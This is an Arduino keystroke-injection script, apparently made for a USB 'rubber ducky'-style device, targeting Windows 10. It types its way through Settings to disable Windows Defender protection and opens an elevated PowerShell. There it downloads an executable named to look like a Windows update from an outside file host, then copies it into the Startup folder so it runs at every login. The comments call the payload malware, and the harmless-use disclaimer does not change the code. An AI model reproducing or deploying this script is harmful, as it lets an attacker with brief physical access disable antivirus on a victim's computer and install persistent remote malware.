/**
 * AUTHOR: Eddie Devine
 * TARGET: Windows 10
 * DESCRIPTION: Installs to startup and runs Enderman's WindowsUpdate.exe.
 * DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
 
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Disable Windows Defender:
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("Settings"));

  delay(500);
  typeKey(KEY_RETURN);

  delay(300);
  typeKey(KEY_TAB);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("C:"));

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(100);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  // Download and Run Malware:
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("powershell"));

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(750);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("$url = \"https://FILEHOST.eddie09.repl.co/Windows_Update_Manager.exe\""));

  typeKey(KEY_RETURN);

  Keyboard.print(F("$outpath = \"C:\\Windows Update Manager.exe\""));

  typeKey(KEY_RETURN);

  Keyboard.print(F("Invoke-WebRequest -Uri $url -OutFile $outpath"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("cmd /c copy \"C:\\Windows Update Manager.exe\" \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""));

  typeKey(KEY_RETURN);

  typeKey(KEY_LEFT_GUI);

  delay(100);
  typeKey(KEY_TAB);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(100);
  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
